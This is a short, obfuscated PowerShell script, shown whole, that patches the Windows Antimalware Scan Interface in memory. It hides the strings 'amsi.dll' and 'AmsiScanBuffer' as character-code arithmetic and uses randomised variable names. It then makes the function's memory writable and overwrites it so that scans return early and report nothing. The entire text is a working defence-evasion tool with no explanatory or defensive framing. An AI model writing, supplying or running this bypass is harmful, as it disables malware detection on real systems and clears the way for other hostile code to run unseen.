$MG4DyzXKcH58Gp = @"
using System;
using System.Runtime.InteropServices;
public class MG4DyzXKcH58Gp {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr CXKNOkfAKPf6Fv6z, string YZBUBycR);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr murKi86W8xzYsWuxQv0b, UIntPtr _D2Cr4B, uint Vwcmj7UvrdhD__zp, out uint o_9u7yfFJ2UcKhEwhK9);
}
"@

Add-Type $MG4DyzXKcH58Gp

$CwNYaEdJJq = [MG4DyzXKcH58Gp]::LoadLibrary("$([chAR]([byTe]0x61)+[chAr](109+14-14)+[CHAR]([ByTe]0x73)+[cHaR]([byte]0x69)+[char]([ByTE]0x2e)+[CHAR](7+93)+[CHAr](108+99-99)+[CHaR]([ByTe]0x6c))")
$fCaa7Rj8qO8PYSuUF = [MG4DyzXKcH58Gp]::GetProcAddress($CwNYaEdJJq, "$([CHar]([byte]0x41)+[char]([bYtE]0x6d)+[cHaR]([Byte]0x73)+[char](105+13-13)+[chAR](83+29-29)+[CHAr]([BYte]0x63)+[CHaR](97)+[CHar](110*33/33)+[CHAr](66*53/53)+[CHaR](117)+[ChAR](102)+[chAR]([byTE]0x66)+[cHAR]([Byte]0x65)+[cHAR]([ByTe]0x72))")
$p = 0
[MG4DyzXKcH58Gp]::VirtualProtect($fCaa7Rj8qO8PYSuUF, [uint32]5, 0x40, [ref]$p)
$BAovBPOXgYPsnS9Jtlt = "0xB8"
$txpTg = "0x57"
$ioYG3Y = "0x00"
$QuA2KNPNF9x2HW3ERsQS = "0x07"
$xzEZVkxJF5XI1 = "0x80"
$DBeMwH1XE9 = "0xC3"
$etbOos6F5bC = [Byte[]] ($BAovBPOXgYPsnS9Jtlt,$txpTg,$ioYG3Y,$QuA2KNPNF9x2HW3ERsQS,+$xzEZVkxJF5XI1,+$DBeMwH1XE9)
[System.Runtime.InteropServices.Marshal]::Copy($etbOos6F5bC, 0, $fCaa7Rj8qO8PYSuUF, 6)